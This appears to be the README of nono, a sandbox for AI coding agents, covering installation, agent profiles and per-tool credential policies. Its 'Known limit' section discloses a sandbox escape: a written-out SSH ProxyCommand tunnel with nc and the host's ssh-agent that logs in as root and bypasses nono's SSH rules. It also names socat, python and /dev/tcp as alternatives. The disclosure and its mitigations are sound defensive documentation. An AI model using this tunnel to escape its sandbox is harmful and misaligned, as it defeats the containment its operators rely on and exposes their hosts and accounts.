<div align="center">

<img src="assets/logo.gif" alt="nono logo" width="600"/>

<p>
  Built by the team that brought you
  <a href="https://sigstore.dev"><strong>Sigstore</strong></a>
  <br/>
  <sub>The standard for secure software attestation, used by PyPI, npm, brew, and Maven Central</sub>
</p>
<p>
  <a href="https://opensource.org/licenses/Apache-2.0"><img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg" alt="License"/></a>
  <a href="https://github.com/nolabs-ai/nono/actions/workflows/ci.yml"><img src="https://github.com/nolabs-ai/nono/actions/workflows/ci.yml/badge.svg" alt="CI Status"/></a>
  <a href="https://www.bestpractices.dev/projects/13332"><img src="https://www.bestpractices.dev/projects/13332/badge" alt="OpenSSF Best Practices"/></a>
  <a href="https://docs.nono.sh"><img src="https://img.shields.io/badge/Docs-docs.nono.sh-green.svg" alt="Documentation"/></a>
</p>
<p>
  <a href="https://discord.gg/G6qDa7cC7x">
    <img src="https://img.shields.io/badge/Chat-Join%20Discord-7289da?style=for-the-badge&logo=discord&logoColor=white" alt="Join Discord"/>
  </a>
   <a href="https://nolabs.ai/careers">
      <img src="https://img.shields.io/badge/We're_Hiring-Join_the_team-ff4f00?style=for-the-badge&logo=githubsponsors&logoColor=white" alt="We're hiring"/>
  </a>
  <a href="https://github.com/marketplace/actions/agent-sign">
    <img src="https://img.shields.io/badge/Secure_Action-agent--sign-2088FF?style=for-the-badge&logo=github-actions&logoColor=white" alt="agent-sign GitHub Action"/>
  </a>
</p>

---
</div>

> [!NOTE]
> In the lead-up to a 1.0 release, APIs are stabilizing. API changes may still occur where necessary, but will be kept to a minimum.

> [!IMPORTANT]
> **Organization migration:** The official nono registry namespace has moved from `always-further` to `nolabs-ai`. Update any references in your scripts, profiles, and CI.
> If you already have a pack installed under the old namespace, remove it first before pulling from the new one:
> ```bash
> nono remove always-further/claude
> nono pull nolabs-ai/claude
> ```
> The old namespace will be retired — migrate now.

**Run AI agents in a zero latency sandbox in seconds and with zero setup** — *Claude Code, Codex, Pi, CoPilot, Hermes, OpenCode, OpenClaw* and more — nono gets you up and running within seconds, with no daemon, no container, no VM, and no disk space usage. Out of the box, nono enforces a least-privilege sandbox and supports macOS, Linux, and Windows (WSL2).

From here **fork the config**, tweak it, theme it, make it your own, and share it with your team or the community via the [nono registry](https://registry.nono.sh).

**Want to operationalise and run at scale or within your team?** Engineers at some of the largest tech companies in the world use nono as part of their workflows or to run AI agents in production.

> “Datadog engineers want their agents to move fast, and we want our credentials and production systems kept safe while they do. nono is the only sandbox that gives us both fine-grained, per-command policies and sophisticated credential management that fits existing, complex real-world toolchains.”
> James Carnegie -- Staff Security Engineer, Datadog

> "Security is embedded in everything we build at Okta. nono gives us the confidence to innovate with AI agents by isolating their execution in a highly secure, policy-controlled sandbox. It ensures our credentials remain locked down and protected, without sacrificing developer velocity"
> Leonardo Zanivan, Principal Engineer, Okta

**Copied by many** — nono pioneered the zero-latency, zero-setup agent sandbox, and continues to innovate and lead the way in agent sandboxing.

---

## Quickstart

#### curl

```bash
curl -fsSL https://nono.sh/install.sh | sh
```

#### macOS / Linux (Homebrew)
```bash
brew install nono
```

#### Nix

The project provides a Nix flake with three outputs:

- `#default` (from source) — builds from source with [crane](https://github.com/ipetkov/crane); dependencies compile once into a separate `nono-deps` derivation, so later source changes only rebuild the workspace crates
- `#deps` — the dependency-only derivation on its own, for warming a binary cache
- `#prebuilt` — fetches the official release binary from GitHub Releases (fast, no compilation)

```bash
# Run without installing (from source)
nix run github:nolabs-ai/nono

# Run the prebuilt binary (no compilation)
nix run github:nolabs-ai/nono#prebuilt

# Install into your profile
nix profile add github:nolabs-ai/nono

# Pin to the latest release
nix run "github:nolabs-ai/nono?ref=$(curl -fsSL https://api.github.com/repos/nolabs-ai/nono/releases/latest | jq -r .tag_name)"
```

**Other platforms** — Debian/Ubuntu, Fedora, Arch, RHEL, openSUSE, WSL2: [see install instructions](https://nono.sh/docs/cli/getting_started/installation).

## Run it!

Search for an agent in the registry, then run it:

```bash
$ nono search opencode
nolabs-ai/opencode	-	Official Opencode Plugin

$ nono run --profile nolabs-ai/opencode -- opencode
```

That's it. `opencode` now runs with read/write access to the current directory and **nothing else** — your SSH keys, your cloud credentials, the rest of your disk are invisible to it.

Profiles for all the popular agents live at [registry.nono.sh](https://registry.nono.sh), secured and ready to pull. Each one bundles the right filesystem scope, network allowlist, hooks, skills and more.

## Make it your own!

Outgrow the defaults? Scaffold a profile and tweak it — same command you already know:

```bash
nono profile init opencode --extends nolabs-ai/opencode
nono run --profile opencode -- opencode
```

`nono profile init` exports an extended and editable profile file for your agent, that inherits from the specified base profile. That profile is composable JSON, so you can review the exact filesystem, network, credentials, and tool rules before sharing it with a team or publishing it for the community.

Are you an agent developer and want to publish your own agent package? We would love to have you and promote your work! [See the docs](https://nono.sh/docs/cli/features/package-publishing).

## Sandbox the tools agents call

nono does not stop at "put the agent in a sandbox". Agents delegate real work to tools: `git`, `gh`, `curl`, `kubectl`, package managers, build scripts, MCP clients / servers, and whatever else is on `PATH`. Those tools are often where secrets, network access, and side effects show up. Most sandboxes just give the agent a blanket policy where a secret is universally available to the entire agent and every tool, but nono is different:

nono can put delegated tools in their own isolated child sandboxes, outside the agent's control. The agent gets its session sandbox; when it calls a controlled tool, nono's broker launches that tool with a separate policy, separate filesystem grants, separate network rules, and separate credentials. The tool does not inherit the agent's broad `--allow` grants, CWD access, raw credential paths, or network access unless its own policy says so.

That means a profile can express rules like:

- the agent may call `git`, but `git` only gets the repo, trusted Git config files, and the Git object store
- the agent may call `gh`, but `gh` only receives a GitHub token through nono's credential proxy
- that token may only be used against selected GitHub API methods and paths through L7 filtering
- `git` may call `ssh` under a chained policy, while direct `ssh` from the agent stays denied

The policy lives in the profile, not in the prompt. The agent can ask for a tool, but it cannot widen that tool's sandbox, mint new keys, or bypass endpoint policy from inside the session.

```json
{
  "command_policies": {
    "credentials": {
      "github-api": {
        "type": "proxy",
        "upstream": "https://api.github.com",
        "credential_key": "keyring://gh:github.com/example?decode=go-keyring",
        "env_var": "GH_TOKEN",
        "inject_header": "Authorization",
        "credential_format": "Bearer {}"
      }
    },
    "commands": {
      "gh": {
        "from": {
          "session": {
            "sandbox": {
              "fs_read": ["."],
              "credentials": [
                {
                  "name": "github-api",
                  "endpoint_policy": {
                    "default": "deny",
                    "allow": [
                      { "method": "GET", "path": "/repos/nolabs-ai/nono/issues/**" }
                    ]
                  }
                }
              ]
            },
            "invocation_policy": {
              "default": "deny",
              "allow": [
                { "argv": { "prefix": ["issue", "list"] } },
                { "argv": { "prefix": ["issue", "view"] } }
              ]
            }
          }
        }
      }
    }
  }
}
```

Read more in [Sandboxed Tool Execution](https://nono.sh/docs/cli/features/tool-sandbox).

## Known limit: SSH tunnels through an allowed session

`--allow-ssh qubasa@build.example.com` lets the sandbox log in to that host as `qubasa`, and only as `qubasa`: a sandboxed `ssh root@build.example.com` is refused by nono. nono enforces this for the SSH connection it mediates. It cannot see inside that connection, so a sandboxed process can build a second, unmediated SSH session through the first one:

```sh
# inside the sandbox, with only qubasa@build.example.com allowed
ssh -o 'ProxyCommand ssh qubasa@build.example.com nc 127.0.0.1 22' \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o PubkeyAuthentication=yes -o IdentityAgent="$SSH_AUTH_SOCK" \
    root@127.0.0.1 id
```

The outer `ssh` is an allowed login as `qubasa` running an ordinary command, `nc`, which nono permits on an endpoint without a command list. On the remote host `nc` connects back to the local sshd, and the inner `ssh` speaks SSH straight to it. nono relays the bytes without seeing the name `root`, so none of its SSH rules apply to the inner session: not the user check and not the refusal of `-L`, `-A` or `-J`. Any tool that opens a socket on the remote host does the same job: `socat`, `python`, or `bash`'s `/dev/tcp`.

The inner login still has to authenticate. The sandbox cannot read `~/.ssh`, but with `linux.af_unix_mediation` left at its default (`off`) in proxy-only mode it **can** connect to the host's ssh-agent at `$SSH_AUTH_SOCK`. If that agent holds a key that another account on the host accepts, such as `root`, the inner login succeeds as that account. Without any usable key the same tunnel still reaches every other host and port that the remote host can reach, for example `ssh qubasa@build.example.com nc example.com 443`.

To close it:

- Give endpoints an agent should not have a shell on a `commands` list. An endpoint limited to `git-upload-pack /srv/repo.git` cannot run `nc`. Avoid interpreters such as `sh` or `python3` in the list, since they read a script from stdin.
- Set `"linux": {"af_unix_mediation": "pathname"}` so the sandbox cannot reach your ssh-agent.
- Restrict the key on the remote host with `restrict,command="…"` in `authorized_keys`. The remote host is the only place a login can be limited in a way nothing inside the session can undo.

## Ready to go deep?

Head over to the [docs](https://nono.sh/docs) and discover nono's rich composable policy system, credentials injection, L7 filtering, supply chain security, rollback, multiplexing, audit and more.

## Library support

nono provides FFI bindings for Rust, Python, TypeScript, and Go.

Also available as [Python](https://github.com/nolabs-ai/nono-py), [TypeScript](https://github.com/nolabs-ai/nono-ts), and [Go](https://github.com/nolabs-ai/nono-go) bindings.

## Contributing

We encourage using AI tools to contribute. However, you must understand and carefully review any AI-generated code before submitting. Security is paramount. If you don't understand how a change works, ask in [Discord](https://discord.gg/G6qDa7cC7x) first.

## Security

If you discover a security vulnerability, please **do not open a public issue**. Follow the process in our [Security Policy](https://github.com/nolabs-ai/nono/security).

## License

Apache-2.0
